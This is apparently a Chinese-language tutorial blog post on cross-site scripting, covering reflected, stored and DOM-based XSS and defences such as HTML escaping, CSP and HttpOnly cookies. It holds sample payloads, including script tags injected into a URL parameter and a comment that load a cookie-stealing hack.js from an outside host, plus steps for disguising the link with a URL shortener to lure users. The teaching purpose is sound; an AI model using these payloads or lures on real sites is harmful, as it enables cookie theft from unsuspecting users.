---
title: XSS 攻击
tags: ['web攻击']
categories: ['web安全']
date: 2022-02-08 09:34:35
---

# 1. XSS 攻击

XSS，全称Cross-Site Scripting，跨站脚本攻击，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获得用户的敏感信息，如：cookie等，进而危害数据安全。

XSS攻击的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

XSS攻击可能造成的危害：

- 窃取Cookie或者本，发送恶意请求
- 在网页插入恶意内容
- 获取网站和用户个人信息
- 其他利用用js脚本能造成的危害

## XSS攻击分类

根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。

|类型|存储区|插入点|
|-|-|-|
|反射型XSS|URL|HTML|
|存储型XSS|后端数据库|HTML|
|DOM型XSS|后端数据库/前端存储/URL|前端JavaScript|

### 反射型XSS（url参数直接注入）

实现攻击步骤：

1. alert尝试（看该网站是否有 XSS 漏洞）
2. 构造攻击url
3. 短域名伪造（通过短域名生成网站把上面构造的 XSS 攻击url转换成看似正常的url）
4. 把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）
5. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
6. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

例如：

```js
// 正常url
http://localhost:3000/?from=china

// 1. alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 2. 构造攻击url：hack.js实现获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url 
// 4. 把构造好的url放到贴吧
// 5. 用户打开带有恶意代码的 URL
// 后续步骤...
```

### 存储型 XSS - 存储到数据库后读取时攻击

实现攻击步骤：

1. alert尝试（看该网站是否有 XSS 漏洞）
2. 构造攻击脚本
3. 把攻击脚本注入网站数据库
4. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
5. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

**反射型 XSS 跟存储型 XSS 的区别是：**存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

例如：

```js

// 1. alert尝试
// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞
<script>alert(1)</script>

// 2. 构造攻击脚本：hack.js实现获取Cookie
我来了<script src="http://localhost:4000/hack.js"></script>

// 3. 把攻击脚本注入网站数据库：通过发评论实现
// 4. 用户访问该网页
// 后续步骤...
```

### DOM 型 XSS

实现攻击步骤：

- 攻击者构造出特殊的 URL，其中包含恶意代码（恶意代码也可以存储在数据库或前端存储）。
- 用户打开带有恶意代码的 URL。
- 用户浏览器接收到响应后解析执行，**前端 JavaScript 取出 URL 中的恶意代码并执行**。
- 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**DOM 型 XSS 跟前两种 XSS 的区别**：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

## XSS攻击防范

### 预防存储型和反射型 XSS 攻击

存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

- 改成纯前端渲染，把代码和数据分隔开。
- 对 HTML 做充分转义。

#### 纯前端渲染

纯前端渲染的过程：

浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
然后浏览器执行 HTML 中的 JavaScript。
JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。
**在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。**

但**纯前端渲染还需注意避免 DOM 型 XSS 漏洞**（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。

在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 或者的问题。

#### HTML 转义

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。

常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 & < > " ' / 这几个字符简单转义掉，确实能起到一定的 XSS 防护作用，但并不完善：

|XSS 安全漏洞|简单转义是否有防护作用|
|-|-|
|HTML 标签文字内容|有|
|HTML 属性值|有|
|CSS 内联样式|无|
|内联 JavaScript|无|
|内联 JSON|无|
|跳转链接|无|

所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。例如 Java 工程里常用的转义库为 org.owasp.encoder，如果是node项目可以用 [xss](https://jsxss.com/zh/index.html)。

### 预防 DOM 型 XSS 攻击（前端重点）

DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。

如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。

DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，`<a>` 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。

### 其他 XSS 防范措施

虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。

- HttpOnly Cookie

#### 浏览器 XSS 过滤

通过设置响应标头实现 XSS 过滤。配置语法如下：

> X-XSS-Protection: 0

> X-XSS-Protection: 1

> X-XSS-Protection: 1; mode=block

> X-XSS-Protection: 1; report=<reporting-uri>


- 0 关闭XSS过滤。
- 1 启用XSS过滤（通常是浏览器默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
- 1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
- 1; report= <reporting-uri> (Chromium only)。启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP [report-uri](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri) 指令的功能发送违规报告。

例如在koa框架中设置：

```js
ctx.set('X-XSS-Protection', 1) //0 关闭XSS过滤，1 启用 XSS 过滤（浏览器默认值）
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截
```

### 内容安全策略

内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

```js
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'
// 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*
// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'
```

更多配置详见：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy。


### HttpOnly Cookie

这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为 HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。

```js
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```

### 其他

- 输入长度控制（增加 XSS 攻击的难度）
- 验证码（防止脚本冒充用户提交危险操作）

## 总结

XSS 攻击是一种代码注入攻击，主要分为3类：反射型、存储型和DOM型。反射型和存储型主要在后端通过HTML转义（通常使用html转移库）防御，或者采用纯前端渲染。

在纯前端渲染中，我们要明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。这样浏览器不会被轻易的被欺骗，执行预期外的代码。纯前端渲染还需注意避免 DOM 型 XSS 漏洞，在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上。如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。对于不可信的内容像后端一样通过HTML转义库来处理。

此外，还有其他的xss防御措施包括：浏览器 XSS 过滤、内容安全策略、HttpOnly Cookie、输入长度控制和验证码等。

## 参考

- [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)
- [Content-Security-Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy)
- [X-XSS-Protection](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection)

